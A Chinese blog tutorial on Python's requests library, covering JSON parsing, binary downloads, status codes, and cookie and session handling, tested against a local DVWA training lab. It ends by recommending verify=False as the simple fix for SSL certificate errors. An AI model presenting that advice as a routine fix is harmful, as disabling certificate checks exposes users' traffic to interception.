<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;data&quot;: &quot;&quot;, </span><br><span class="line">  &quot;files&quot;: &#123;&#125;, </span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;age&quot;: &quot;22&quot;, </span><br><span class="line">    &quot;name&quot;: &quot;germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Content-Length&quot;: &quot;18&quot;, </span><br><span class="line">    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-603a179f-426a621011f59bda70eb583d&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;json&quot;: null, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.81&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>请求的数据包</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817123219791.png" alt="image-20210817123219791"></p>
<h1 id="JSON解码"><a href="#JSON解码" class="headerlink" title="JSON解码"></a>JSON解码</h1><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>下面的就是用的AJAX实现的</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-02-2716-43-14.gif" alt="2021-02-2716-43-14"></p>
<div class="note info simple"><p>JSON和XML差不多用来保存数据的</p>
</div> 

<div class="note info simple"><p>下面这个就是JSON数据</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227170319476.png" alt="image-20210227170319476"></p>
<p>JSON–就是键值对</p>
<p>地址是<code>https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6350051297420797401&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=a&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=&amp;z=&amp;ic=&amp;hd=&amp;latest=&amp;copyright=&amp;word=a&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=&amp;istype=&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=30&amp;rn=30&amp;gsm=1e&amp;1614416309835=</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210227170354540.png" alt="image-20210227170354540"></p>
<div class="note info simple"><p>我们就可以用响应属性json()属性来解析他</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"></span><br><span class="line"><span class="comment"># https://api.github.com/events是json地址</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>)</span><br><span class="line"><span class="comment"># 解析json并输出出来</span></span><br><span class="line">print(r.json())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#123;u&#39;repository&#39;: &#123;u&#39;open_issues&#39;: 0, u&#39;url&#39;: &#39;......太多了</span><br></pre></td></tr></table></figure>
<h1 id="抓取二进制数据"><a href="#抓取二进制数据" class="headerlink" title="抓取二进制数据"></a>抓取二进制数据</h1><div class="note info simple"><p>抓取二进制的的比如图片、音频、视频等文件，我们就可以用响应属性content属性</p>
</div> 

<div class="note info simple"><p>下面就抓取这个照片我的头像嘻嘻地址<code>https://gitee.com/wzass/zp/raw/master/img/avatar.png</code></p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227173458314.png" alt="image-20210227173458314"></p>
<div class="note info simple"><p>我们先看一下输出的二进制</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;https://gitee.com/wzass/zp/raw/master/img/avatar.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>
<p>结果什么也看不懂</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H-�@��9��[��]K��&#x2F;H�H��Tԃ7&#x2F;�&#x2F;����.�5�؊�X��EMES��^�O���q�TQՓ      �8�Lٙ�Y#�JБ�L՚�ٞ�ٟڠ&#x3D;��;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我们可以叫他直接保存上图像，要是保存文件是二进制要<code>wb</code>这样写入文件必然不行</p>
</div> 

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求我的头像图片</span></span><br><span class="line">r = requests.get(<span class="string">&quot;https://gitee.com/wzass/zp/raw/master/img/avatar.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件的方式打开</span></span><br><span class="line">a=open(<span class="string">&#x27;a.png&#x27;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向a.png文件里面写入请求的返回二进制的内容</span></span><br><span class="line">a.write(r.content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<p><strong>结果可以看见没有问题，也可以获取音频和视频文件</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227174629310.png" alt="image-20210227174629310"></p>
<h1 id="响应头判断"><a href="#响应头判断" class="headerlink" title="响应头判断"></a>响应头判断</h1><div class="note info simple"><p>状态码常用来判断请求是否成功，而 requests 还提供了一个内置的状态码查询对象<code>requests.codes</code></p>
</div> 

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 信息性状态码</span><br><span class="line">100: (&#39;continue&#39;,),</span><br><span class="line">101: (&#39;switching_protocols&#39;,),</span><br><span class="line">102: (&#39;processing&#39;,),</span><br><span class="line">103: (&#39;checkpoint&#39;,),</span><br><span class="line">122: (&#39;uri_too_long&#39;, &#39;request_uri_too_long&#39;),</span><br><span class="line"></span><br><span class="line"># 成功状态码</span><br><span class="line">200: (&#39;ok&#39;, &#39;okay&#39;, &#39;all_ok&#39;, &#39;all_okay&#39;, &#39;all_good&#39;, &#39;\\o&#x2F;&#39;, &#39;✓&#39;),</span><br><span class="line">201: (&#39;created&#39;,),</span><br><span class="line">202: (&#39;accepted&#39;,),</span><br><span class="line">203: (&#39;non_authoritative_info&#39;, &#39;non_authoritative_information&#39;),</span><br><span class="line">204: (&#39;no_content&#39;,),</span><br><span class="line">205: (&#39;reset_content&#39;, &#39;reset&#39;),</span><br><span class="line">206: (&#39;partial_content&#39;, &#39;partial&#39;),</span><br><span class="line">207: (&#39;multi_status&#39;, &#39;multiple_status&#39;, &#39;multi_stati&#39;, &#39;multiple_stati&#39;),</span><br><span class="line">208: (&#39;already_reported&#39;,),</span><br><span class="line">226: (&#39;im_used&#39;,),</span><br><span class="line"></span><br><span class="line"># 重定向状态码</span><br><span class="line">300: (&#39;multiple_choices&#39;,),</span><br><span class="line">301: (&#39;moved_permanently&#39;, &#39;moved&#39;, &#39;\\o-&#39;),</span><br><span class="line">302: (&#39;found&#39;,),</span><br><span class="line">303: (&#39;see_other&#39;, &#39;other&#39;),</span><br><span class="line">304: (&#39;not_modified&#39;,),</span><br><span class="line">305: (&#39;use_proxy&#39;,),</span><br><span class="line">306: (&#39;switch_proxy&#39;,),</span><br><span class="line">307: (&#39;temporary_redirect&#39;, &#39;temporary_moved&#39;, &#39;temporary&#39;),</span><br><span class="line">308: (&#39;permanent_redirect&#39;,</span><br><span class="line">      &#39;resume_incomplete&#39;, &#39;resume&#39;,), # These 2 to be removed in 3.0</span><br><span class="line"></span><br><span class="line"># 客户端错误状态码</span><br><span class="line">400: (&#39;bad_request&#39;, &#39;bad&#39;),</span><br><span class="line">401: (&#39;unauthorized&#39;,),</span><br><span class="line">402: (&#39;payment_required&#39;, &#39;payment&#39;),</span><br><span class="line">403: (&#39;forbidden&#39;,),</span><br><span class="line">404: (&#39;not_found&#39;, &#39;-o-&#39;),</span><br><span class="line">405: (&#39;method_not_allowed&#39;, &#39;not_allowed&#39;),</span><br><span class="line">406: (&#39;not_acceptable&#39;,),</span><br><span class="line">407: (&#39;proxy_authentication_required&#39;, &#39;proxy_auth&#39;, &#39;proxy_authentication&#39;),</span><br><span class="line">408: (&#39;request_timeout&#39;, &#39;timeout&#39;),</span><br><span class="line">409: (&#39;conflict&#39;,),</span><br><span class="line">410: (&#39;gone&#39;,),</span><br><span class="line">411: (&#39;length_required&#39;,),</span><br><span class="line">412: (&#39;precondition_failed&#39;, &#39;precondition&#39;),</span><br><span class="line">413: (&#39;request_entity_too_large&#39;,),</span><br><span class="line">414: (&#39;request_uri_too_large&#39;,),</span><br><span class="line">415: (&#39;unsupported_media_type&#39;, &#39;unsupported_media&#39;, &#39;media_type&#39;),</span><br><span class="line">416: (&#39;requested_range_not_satisfiable&#39;, &#39;requested_range&#39;, &#39;range_not_satisfiable&#39;),</span><br><span class="line">417: (&#39;expectation_failed&#39;,),</span><br><span class="line">418: (&#39;im_a_teapot&#39;, &#39;teapot&#39;, &#39;i_am_a_teapot&#39;),</span><br><span class="line">421: (&#39;misdirected_request&#39;,),</span><br><span class="line">422: (&#39;unprocessable_entity&#39;, &#39;unprocessable&#39;),</span><br><span class="line">423: (&#39;locked&#39;,),</span><br><span class="line">424: (&#39;failed_dependency&#39;, &#39;dependency&#39;),</span><br><span class="line">425: (&#39;unordered_collection&#39;, &#39;unordered&#39;),</span><br><span class="line">426: (&#39;upgrade_required&#39;, &#39;upgrade&#39;),</span><br><span class="line">428: (&#39;precondition_required&#39;, &#39;precondition&#39;),</span><br><span class="line">429: (&#39;too_many_requests&#39;, &#39;too_many&#39;),</span><br><span class="line">431: (&#39;header_fields_too_large&#39;, &#39;fields_too_large&#39;),</span><br><span class="line">444: (&#39;no_response&#39;, &#39;none&#39;),</span><br><span class="line">449: (&#39;retry_with&#39;, &#39;retry&#39;),</span><br><span class="line">450: (&#39;blocked_by_windows_parental_controls&#39;, &#39;parental_controls&#39;),</span><br><span class="line">451: (&#39;unavailable_for_legal_reasons&#39;, &#39;legal_reasons&#39;),</span><br><span class="line">499: (&#39;client_closed_request&#39;,),</span><br><span class="line"></span><br><span class="line"># 服务端错误状态码</span><br><span class="line">500: (&#39;internal_server_error&#39;, &#39;server_error&#39;, &#39;&#x2F;o\\&#39;, &#39;✗&#39;),</span><br><span class="line">501: (&#39;not_implemented&#39;,),</span><br><span class="line">502: (&#39;bad_gateway&#39;,),</span><br><span class="line">503: (&#39;service_unavailable&#39;, &#39;unavailable&#39;),</span><br><span class="line">504: (&#39;gateway_timeout&#39;,),</span><br><span class="line">505: (&#39;http_version_not_supported&#39;, &#39;http_version&#39;),</span><br><span class="line">506: (&#39;variant_also_negotiates&#39;,),</span><br><span class="line">507: (&#39;insufficient_storage&#39;,),</span><br><span class="line">509: (&#39;bandwidth_limit_exceeded&#39;, &#39;bandwidth&#39;),</span><br><span class="line">510: (&#39;not_extended&#39;,),</span><br><span class="line">511: (&#39;network_authentication_required&#39;, &#39;network_auth&#39;, &#39;network_authentication&#39;)</span><br></pre></td></tr></table></figure>


<div class="note info simple"><p>我就演示一下</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227181325655.png" alt="image-20210227181325655"></p>
<div class="note info simple"><p>我们就可以利用这个对象进行判断网站是否请求成功</p>
</div> 

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求百度</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># status_code属性显示请求返回的状态码，requests.codes.ok是200状态码</span></span><br><span class="line"><span class="keyword">if</span> (r.status_code) == (requests.codes.ok):<span class="comment"># 进行比较</span></span><br><span class="line">    print(<span class="string">&quot;请求成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;请求错误&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求成功</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227182700730.png" alt="image-20210227182700730"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>这个环境我用的是<code>upload-labs-master</code>靶场</p>
<h1 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h1><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>下面我测试的都是DVWA的靶场测试的，看一下他的Cookies</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304101706596.png" alt="image-20210304101706596"></p>
<p>我们简单看一下他的类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(r.cookies)</span><br><span class="line">&lt;RequestsCookieJar[&lt;Cookie PHPSESSID=sfolaoe246rpommhebuttunc37 <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.31</span><span class="number">.122</span>/&gt;, &lt;Cookie security=low <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.31</span><span class="number">.122</span>/&gt;]&gt;</span><br></pre></td></tr></table></figure>
<p>他是一个<code>RequestCookieJar</code> 类型的数据</p>
<div class="note info simple"><p>我们可以用<code>items()</code>方法将其转化为元组组成的列表</p>
</div> 

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.cookies)</span><br><span class="line"><span class="comment"># 用items()方法将其转化为元组组成的列表</span></span><br><span class="line">print(r.cookies.items())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;cakg0rbnm1tpoeqoup5ihcmcg4 for 192.168.31.122&#x2F;&gt;, &lt;Cookie security&#x3D;low for 192.168.31.122&#x2F;&gt;]&gt;</span><br><span class="line">[(&#39;PHPSESSID&#39;, &#39;cakg0rbnm1tpoeqoup5ihcmcg4&#39;), (&#39;security&#39;, &#39;low&#39;)]</span><br></pre></td></tr></table></figure>
<p>图示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304102253008.png" alt="image-20210304102253008"></p>
<div class="note info simple"><p>上面这个理解可能有点难看一下下面的照片就知道了</p>
</div> 

<p>可以看见他俩是一样的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304102500442.png" alt="image-20210304102500442"></p>
<h2 id="用Cookies进行登录"><a href="#用Cookies进行登录" class="headerlink" title="用Cookies进行登录"></a>用Cookies进行登录</h2><div class="note info simple"><p>下面这个DVWA登录进入我直接就Cookies给复制出来</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304103208127.png" alt="image-20210304103208127"></p>
<p>内容是<code>PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low</code></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;   <span class="comment"># 叫Cookie头添加进入</span></span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;http://192.168.31.122:8888/index.php&quot;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应的源码</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果</p>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304104218669.png" alt="image-20210304104218669"></p>
<div class="note info simple"><p>我叫Cookie故意写错看看他就不会登录</p>
</div> 

<p>可以看见严重失败</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304104332236.png" alt="image-20210304104332236"></p>
<h2 id="构建RequestCookieJar-对象登录"><a href="#构建RequestCookieJar-对象登录" class="headerlink" title="构建RequestCookieJar 对象登录"></a>构建<code>RequestCookieJar</code> 对象登录</h2><div class="note info simple"><p><code>RequestsCookieJar</code> 对象发送请求头，这相对烦琐</p>
</div> 

<p>书上写的是下面这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫cookies给cookies变量</span></span><br><span class="line">cookies = <span class="string">&#x27;PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建了一个 RequestCookieJar 对象</span></span><br><span class="line">jar = requests.cookies.RequestsCookieJar()</span><br><span class="line"></span><br><span class="line"><span class="comment"># split() 方法分割</span></span><br><span class="line"><span class="keyword">for</span> cookie <span class="keyword">in</span> cookies.split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">    <span class="comment"># split() 方法分割 </span></span><br><span class="line">    key, value = cookie.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># set() 方法设置好每个 Cookie 的 key 和 value</span></span><br><span class="line">    jar.set(key, value)</span><br><span class="line">print(jar.items())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(&#39; security&#39;, &#39;low&#39;), (&#39;PHPSESSID&#39;, &#39;6sthdjb3suu0obt57lds55ah95&#39;)]</span><br></pre></td></tr></table></figure>


<div class="note info simple"><p>上面的代码分析主要分析12行往下的</p>
</div> 

<div class="note info simple"><p>第12行，可以看一下他的分割的结果,split()方法可以在我以前写的博客上有介绍<a href="https://www.zssnp.top/2020/05/01/python%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0-1">https://www.zssnp.top/2020/05/01/python</a></p>
</div> 



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 叫cookies给cookies变量</span></span><br><span class="line">cookies = <span class="string">&#x27;PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建了一个 RequestCookieJar 对象</span></span><br><span class="line">jar = requests.cookies.RequestsCookieJar()</span><br><span class="line"></span><br><span class="line"><span class="comment"># split() 方法分割，分割;的，他会变成列表</span></span><br><span class="line">cookie=cookies.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">print(cookie)</span><br></pre></td></tr></table></figure>
<p>结果可以看见他遇到<code>;</code>就会分割</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;PHPSESSID&#x3D;6sthdjb3suu0obt57lds55ah95&#39;, &#39; security&#x3D;low&#39;]</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>第14行叫分割的二个参数都给key，value</p>
</div> 

<p>代码分析，应为上面的用了<code>in</code>他只会提取第一个列表，下面我这个就直接用指定列表来演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 叫cookies给cookies变量</span></span><br><span class="line">cookies = <span class="string">&#x27;PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建了一个 RequestCookieJar 对象</span></span><br><span class="line">jar = requests.cookies.RequestsCookieJar()</span><br><span class="line"></span><br><span class="line"><span class="comment"># split() 方法分割，分割;的，他会变成列表</span></span><br><span class="line">cookie=cookies.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应为上面的用了`in`他只会提取第一个列表,下面我这个就直接用指定列表,叫分割的二个参数都给key，value</span></span><br><span class="line">key, value=cookie[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(cookie)</span><br><span class="line">print(key)</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;PHPSESSID&#x3D;6sthdjb3suu0obt57lds55ah95&#39;, &#39; security&#x3D;low&#39;]</span><br><span class="line">PHPSESSID   # key变量输出的</span><br><span class="line">6sthdjb3suu0obt57lds55ah95 # value变量输出的</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304182658147.png" alt="image-20210304182658147"></p>
<div class="note info simple"><p>第16行叫key，value变量给了构建<code>RequestCookieJar</code>对象</p>
</div> 

<p>代码介绍</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 叫cookies给cookies变量</span></span><br><span class="line">cookies = <span class="string">&#x27;PHPSESSID=6sthdjb3suu0obt57lds55ah95; security=low&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建了一个 RequestCookieJar 对象</span></span><br><span class="line">jar = requests.cookies.RequestsCookieJar()</span><br><span class="line"></span><br><span class="line"><span class="comment"># split() 方法分割，分割;的，他会变成列表</span></span><br><span class="line">cookie=cookies.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应为上面的用了`in`他只会提取第一个列表,下面我这个就直接用指定列表,叫分割的二个参数都给key，value</span></span><br><span class="line">key, value=cookie[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫key，value变量给了构建`RequestCookieJar`对象</span></span><br><span class="line">jar.set(key, value)</span><br><span class="line"></span><br><span class="line">print(cookie)</span><br><span class="line">print(key)</span><br><span class="line">print(value)</span><br><span class="line">print(jar.items())</span><br></pre></td></tr></table></figure>
<p>结果，应为是他是列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;PHPSESSID&#x3D;6sthdjb3suu0obt57lds55ah95&#39;, &#39; security&#x3D;low&#39;]</span><br><span class="line">PHPSESSID   # key变量输出的</span><br><span class="line">6sthdjb3suu0obt57lds55ah95 # value变量输出的</span><br><span class="line">[(&#39;PHPSESSID&#39;, &#39;6sthdjb3suu0obt57lds55ah95&#39;)] # jar.items()输出</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304183802426.png" alt="image-20210304183802426"></p>
<h1 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h1><div class="note info simple"><p>如果我们用同二个请求，也就是说相当于你用了两个浏览器打开了不同的页面</p>
</div> 

<div class="note info simple"><p>我在两次请求时设置一样的 <code>cookies</code> 不就行了这样比较繁琐</p>
</div> 

<div class="note info simple"><p>我们就可以用<code>Session</code> 对象，就不用担心 <code>cookies</code>的问题了，下面的测试用的环境是DVWA</p>
</div> 

<div class="note info simple"><p>我直接请求二次查看他的返回结果</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求第一次</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(r.cookies.items())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求第二次</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(r.cookies.items())</span><br></pre></td></tr></table></figure>
<p>结果,可以看见他两都返回cookies都不一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(&#39;PHPSESSID&#39;, &#39;qkmn8nij18qn0di5pskt4feoq2&#39;), (&#39;security&#39;, &#39;low&#39;)]</span><br><span class="line">[(&#39;PHPSESSID&#39;, &#39;9q9bf1vopsg250c4n79sm4r7b7&#39;), (&#39;security&#39;, &#39;low&#39;)]</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304195318060.png" alt="image-20210304195318060"></p>
<div class="note info simple"><p>用<code>Session</code> 对象维持会话</p>
</div> 

<p>演示</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(r.cookies.items())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求第二次</span></span><br><span class="line">r = s.post(<span class="string">&quot;http://192.168.31.122:8888/login.php&quot;</span>)</span><br><span class="line">print(r.cookies.items())</span><br></pre></td></tr></table></figure>
<p>结果，应为你已经有了请求cookies头，所以第二次就不返回给你cookies了，他已经维持了会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(&#39;PHPSESSID&#39;, &#39;brn2jv2jlik22i9vohlnp6qvp2&#39;), (&#39;security&#39;, &#39;low&#39;)]</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>


<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210304202233606.png" alt="image-20210304202233606"></p>
<h1 id="SSL-证书验证"><a href="#SSL-证书验证" class="headerlink" title="SSL 证书验证"></a>SSL 证书验证</h1><p>这个我就不想找没有认证的ca证书的网站了,下面ca都是我复制书上的</p>
<div class="note info simple"><p>requests 还提供了证书验证的功能，可以使用 <code>verify</code> 参数控制是否检查此证书，默认他是<code>True</code></p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210305074317807.png" alt="image-20210305074317807"></p>
<p>现在我们用 requests 来测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.12306.cn&#x27;</span>)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests.exceptions.SSLError: (&quot;bad handshake: Error([(&#39;SSL routines&#39;, &#39;tls_process_server_certificate&#39;, &#39;certificate verify failed&#39;)],)&quot;,)</span><br></pre></td></tr></table></figure>
<p>这里提示一个错误 <code>SSLError</code>，表示证书验证错误。所以，如果请求一个 HTTPS 站点，但是证书验证错误的页面时，就会报这样的错误，那么如何避免这个错误呢？很简单，把 <code>verify</code> 参数设置为 <code>False</code> 即可</p>
